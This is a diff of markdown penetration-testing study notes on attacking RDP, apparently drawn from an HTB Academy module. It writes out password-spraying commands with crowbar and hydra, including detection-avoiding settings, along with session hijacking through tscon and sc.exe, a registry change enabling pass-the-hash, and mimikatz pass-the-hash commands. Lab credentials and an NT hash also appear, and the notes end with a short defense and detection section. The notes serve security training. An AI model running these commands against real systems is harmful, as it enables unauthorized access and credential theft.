@@ -1,4 +1,4 @@
-# 🔓 RDP (Remote Desktop Protocol) Attacks
+# 🔓 RDP Attacks
 
 ## 🎯 Overview
 
@@ -9,22 +9,25 @@ This document covers **exploitation techniques** against RDP services, focusing 
 ## 🏗️ RDP Attack Methodology
 
 ### Attack Chain Overview
+
 ```
 Service Discovery → Authentication Attacks → Session Exploitation → Privilege Escalation → Lateral Movement
 ```
 
 ### Key Attack Objectives
-- **Password spraying** to avoid account lockouts
-- **Session hijacking** for privilege escalation
-- **Pass-the-Hash attacks** with NT hashes
-- **GUI access** to Windows systems
-- **Credential dumping** from RDP sessions
 
----
+* **Password spraying** to avoid account lockouts
+* **Session hijacking** for privilege escalation
+* **Pass-the-Hash attacks** with NT hashes
+* **GUI access** to Windows systems
+* **Credential dumping** from RDP sessions
+
+***
 
 ## 📍 Service Discovery & Enumeration
 
 ### Default RDP Port Detection
+
 ```bash
 # Default RDP port: TCP/3389
 # HTB Academy enumeration example
@@ -36,6 +39,7 @@ PORT     STATE SERVICE
 ```
 
 ### Advanced RDP Scanning
+
 ```bash
 # Comprehensive RDP scan with scripts
 nmap -Pn -sV -sC -p3389 192.168.2.143
@@ -48,19 +52,21 @@ nmap -p3389 --script rdp-vuln-* 192.168.2.143
 ```
 
 ### Key Information to Extract
-- **RDP service version** (Windows version identification)
-- **Authentication methods** supported
-- **Certificate information** (self-signed vs CA)
-- **Encryption levels** available
-- **Domain membership** status
 
----
+* **RDP service version** (Windows version identification)
+* **Authentication methods** supported
+* **Certificate information** (self-signed vs CA)
+* **Encryption levels** available
+* **Domain membership** status
+
+***
 
 ## ⚔️ Authentication Attacks
 
 ### 1. Password Spraying Attacks
 
 #### Why Password Spraying?
+
 ```
 Traditional brute force: Risk of account lockout
 Password spraying: Single password against multiple users
@@ -68,6 +74,7 @@ Goal: Avoid triggering password policy restrictions
 ```
 
 #### HTB Academy Username List
+
 ```bash
 # Create username list
 cat > usernames.txt << EOF
@@ -83,6 +90,7 @@ EOF
 ### 2. Crowbar Password Spraying
 
 #### Basic Crowbar Usage
+
 ```bash
 # HTB Academy example - single password against user list
 crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
@@ -96,6 +104,7 @@ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 ```
 
 #### Advanced Crowbar Options
+
 ```bash
 # Target multiple hosts
 crowbar -b rdp -s 192.168.1.0/24 -U usernames.txt -c 'Spring2024!'
@@ -110,6 +119,7 @@ crowbar -b rdp -s 192.168.1.100 -U usernames.txt -C passwords.txt
 ### 3. Hydra Password Spraying
 
 #### HTB Academy Hydra Example
+
 ```bash
 # Single password against username list
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
@@ -126,6 +136,7 @@ Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak
 ```
 
 #### Optimized Hydra Commands
+
 ```bash
 # Reduced connections to avoid detection
 hydra -L usernames.txt -p 'password123' -t 1 -W 3 192.168.2.143 rdp
@@ -137,11 +148,12 @@ hydra -L usernames.txt -p 'Spring2024!' -M targets.txt -t 4 -W 5 rdp
 hydra -L usernames.txt -p 'password123' -s 3390 192.168.1.100 rdp
 ```
 
----
+***
 
 ## 🔗 RDP Connection Methods
 
 ### 1. rdesktop Client
+
 ```bash
 # HTB Academy connection example
 rdesktop -u admin -p password123 192.168.2.143
@@ -157,6 +169,7 @@ Do you trust this certificate (yes/no)? yes
 ```
 
 #### rdesktop Advanced Options
+
 ```bash
 # Full screen connection
 rdesktop -u administrator -p password123 -f 192.168.2.143
@@ -169,6 +182,7 @@ rdesktop -u admin -p password123 -r sound:local -r clipboard:PRIMARYCLIPBOARD 19
 ```
 
 ### 2. xfreerdp Client
+
 ```bash
 # Modern FreeRDP connection
 xfreerdp /u:administrator /p:password123 /v:192.168.2.143
@@ -180,13 +194,14 @@ xfreerdp /u:admin /p:password123 /v:192.168.2.143 /dynamic-resolution /clipboard
 xfreerdp /u:admin /p:password123 /v:192.168.2.143 /cert-ignore
 ```
 
----
+***
 
 ## 👤 Protocol Specific Attacks
 
 ### 1. RDP Session Hijacking
 
 #### Attack Prerequisites
+
 ```
 ✅ Local Administrator privileges on target machine
 ✅ Another user connected via RDP
@@ -196,7 +211,8 @@ xfreerdp /u:admin /p:password123 /v:192.168.2.143 /cert-ignore
 
 #### HTB Academy Session Hijacking Example
 
-##### Step 1: Identify Active Sessions
+**Step 1: Identify Active Sessions**
+
 ```cmd
 # Query current RDP sessions
 C:\htb> query user
@@ -206,7 +222,8 @@ C:\htb> query user
  lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
 ```
 
-##### Step 2: Create Hijacking Service
+**Step 2: Create Hijacking Service**
+
 ```cmd
 # Create Windows service for session hijacking
 C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
@@ -214,7 +231,8 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 [SC] CreateService SUCCESS
 ```
 
-##### Step 3: Execute Session Hijack
+**Step 3: Execute Session Hijack**
+
 ```cmd
 # Start the hijacking service
 C:\htb> net start sessionhijack
@@ -223,6 +241,7 @@ C:\htb> net start sessionhijack
 ```
 
 #### Alternative Hijacking Methods
+
 ```cmd
 # Direct tscon usage (requires SYSTEM privileges)
 C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
@@ -239,6 +258,7 @@ token::elevate
 ### 2. RDP Pass-the-Hash (PtH) Attack
 
 #### Attack Prerequisites & Limitations
+
 ```
 ⚠️  Restricted Admin Mode must be enabled
 ⚠️  Only works with NT hashes (not NTLMv2)
@@ -247,6 +267,7 @@ token::elevate
 ```
 
 #### Enable Restricted Admin Mode
+
 ```cmd
 # HTB Academy registry modification
 C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
@@ -256,6 +277,7 @@ reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
 ```
 
 #### HTB Academy PtH Execution
+
 ```bash
 # Pass-the-Hash with xfreerdp
 xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
@@ -270,6 +292,7 @@ xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
 ```
 
 #### Alternative PtH Tools
+
 ```bash
 # Using rdesktop with hash (if supported)
 rdesktop -u lewen -p "" -d domain --hash 300FF5E89EF33F83A8146C10F5AB9BB9 192.168.220.152
@@ -278,11 +301,12 @@ rdesktop -u lewen -p "" -d domain --hash 300FF5E89EF33F83A8146C10F5AB9BB9 192.16
 sekurlsa::pth /user:lewen /domain:corp /ntlm:300FF5E89EF33F83A8146C10F5AB9BB9 /run:"mstsc /v:192.168.220.152"
 ```
 
----
+***
 
 ## 🎯 HTB Academy Lab Scenarios
 
 ### Scenario 1: Initial RDP Access
+
 ```bash
 # Target: 10.129.203.13 (ACADEMY-ATTCOMSVC-WIN-01)
 # Credentials: htb-rdp:HTBRocks!
@@ -297,6 +321,7 @@ xfreerdp /u:htb-rdp /p:HTBRocks! /v:10.129.203.13
 ```
 
 ### Scenario 2: Registry Key Knowledge
+
 ```cmd
 # Question: Which registry key needs to be changed to allow Pass-the-Hash with RDP?
 # Answer: DisableRestrictedAdmin
@@ -306,6 +331,7 @@ xfreerdp /u:htb-rdp /p:HTBRocks! /v:10.129.203.13
 ```
 
 ### Scenario 3: Administrator Access
+
 ```bash
 # Task: Connect via RDP with Administrator account and find flag.txt
 
@@ -323,78 +349,85 @@ xfreerdp /v:10.129.203.13 /u:administrator /pth:HASH_VALUE
 # - C:\Users\Administrator\Documents\flag.txt
 ```
 
----
+***
 
 ## 📋 RDP Attack Checklist
 
 ### Discovery & Enumeration
-- [ ] **Port scanning** - TCP/3389 detection
-- [ ] **Version enumeration** - Windows version identification
-- [ ] **Certificate analysis** - Self-signed vs CA certificates
-- [ ] **Domain membership** - Standalone vs domain-joined
+
+* [ ] **Port scanning** - TCP/3389 detection
+* [ ] **Version enumeration** - Windows version identification
+* [ ] **Certificate analysis** - Self-signed vs CA certificates
+* [ ] **Domain membership** - Standalone vs domain-joined
 
 ### Authentication Attacks
-- [ ] **Default credentials** - administrator:password, admin:admin
-- [ ] **Password spraying** - Single password, multiple users
-- [ ] **Common passwords** - Spring2024!, Password123, company name
-- [ ] **Seasonal passwords** - Current year/month variations
+
+* [ ] **Default credentials** - administrator:password, admin:admin
+* [ ] **Password spraying** - Single password, multiple users
+* [ ] **Common passwords** - Spring2024!, Password123, company name
+* [ ] **Seasonal passwords** - Current year/month variations
 
 ### Post-Authentication
-- [ ] **Session enumeration** - Active RDP sessions
-- [ ] **User privilege checking** - Local admin rights
-- [ ] **Session hijacking** - Target high-privilege users
-- [ ] **Hash dumping** - Extract NT hashes for PtH
+
+* [ ] **Session enumeration** - Active RDP sessions
+* [ ] **User privilege checking** - Local admin rights
+* [ ] **Session hijacking** - Target high-privilege users
+* [ ] **Hash dumping** - Extract NT hashes for PtH
 
 ### Advanced Techniques
-- [ ] **Pass-the-Hash** - Registry modification required
-- [ ] **Kerberoasting** - Service account targeting
-- [ ] **Golden/Silver tickets** - Kerberos ticket attacks
-- [ ] **Lateral movement** - RDP to other systems
 
----
+* [ ] **Pass-the-Hash** - Registry modification required
+* [ ] **Kerberoasting** - Service account targeting
+* [ ] **Golden/Silver tickets** - Kerberos ticket attacks
+* [ ] **Lateral movement** - RDP to other systems
+
+***
 
 ## 🛡️ Defense & Mitigation
 
 ### RDP Security Hardening
-- **Network Level Authentication (NLA)** - Enable for all RDP connections
-- **Strong password policies** - Prevent common password usage
-- **Account lockout policies** - Limit failed login attempts
-- **IP restrictions** - Whitelist authorized source IPs
-- **Non-standard ports** - Change from default 3389
-- **VPN requirements** - Require VPN for RDP access
+
+* **Network Level Authentication (NLA)** - Enable for all RDP connections
+* **Strong password policies** - Prevent common password usage
+* **Account lockout policies** - Limit failed login attempts
+* **IP restrictions** - Whitelist authorized source IPs
+* **Non-standard ports** - Change from default 3389
+* **VPN requirements** - Require VPN for RDP access
 
 ### Registry Security
-- **Disable Restricted Admin** - Prevent Pass-the-Hash attacks
-- **Audit registry changes** - Monitor security-related modifications
-- **Group Policy controls** - Centralized RDP security settings
+
+* **Disable Restricted Admin** - Prevent Pass-the-Hash attacks
+* **Audit registry changes** - Monitor security-related modifications
+* **Group Policy controls** - Centralized RDP security settings
 
 ### Monitoring & Detection
-- **Failed authentication logs** - Event ID 4625 monitoring
-- **Successful RDP logins** - Event ID 4624 tracking
-- **Session creation/termination** - Event ID 4778/4779
-- **Unusual source IPs** - Geographic/time-based anomalies
-- **Registry modifications** - Monitor Lsa registry changes
 
----
+* **Failed authentication logs** - Event ID 4625 monitoring
+* **Successful RDP logins** - Event ID 4624 tracking
+* **Session creation/termination** - Event ID 4778/4779
+* **Unusual source IPs** - Geographic/time-based anomalies
+* **Registry modifications** - Monitor Lsa registry changes
+
+***
 
 ## 🔗 Related Techniques
 
-- **[SMB Attacks](smb-attacks.md)** - Credential extraction for RDP PtH
-- **[SQL Attacks](sql-attacks.md)** - Database access for credential discovery
-- **[Pass the Hash](../passwords-attacks/pass-the-hash.md)** - NT hash exploitation
-- **[Active Directory Attacks](../passwords-attacks/active-directory-attacks.md)** - Domain privilege escalation
-- **[Kerberoasting](../passwords-attacks/kerberoasting.md)** - Service account attacks
+* [**SMB Attacks**](smb-attacks.md) - Credential extraction for RDP PtH
+* [**SQL Attacks**](sql-attacks.md) - Database access for credential discovery
+* [**Pass the Hash**](../passwords-attacks/pass-the-hash.md) - NT hash exploitation
+* [**Active Directory Attacks**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/passwords-attacks/active-directory-attacks.md) - Domain privilege escalation
+* [**Kerberoasting**](https://github.com/sco-sec/CPTS-PREP-NOTES/blob/main/passwords-attacks/kerberoasting.md) - Service account attacks
 
----
+***
 
 ## 📚 References
 
-- **HTB Academy** - Attacking Common Services Module
-- **Microsoft RDP Documentation** - Official protocol specifications
-- **Crowbar Tool** - RDP password spraying utility
-- **FreeRDP Project** - Open-source RDP implementation
-- **NIST Guidelines** - Remote access security best practices
+* **HTB Academy** - Attacking Common Services Module
+* **Microsoft RDP Documentation** - Official protocol specifications
+* **Crowbar Tool** - RDP password spraying utility
+* **FreeRDP Project** - Open-source RDP implementation
+* **NIST Guidelines** - Remote access security best practices
 
----
+***
 
-*This document provides comprehensive RDP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment.* 
+_This document provides comprehensive RDP attack methodologies based on HTB Academy's "Attacking Common Services" module, focusing on practical exploitation techniques for penetration testing and security assessment._
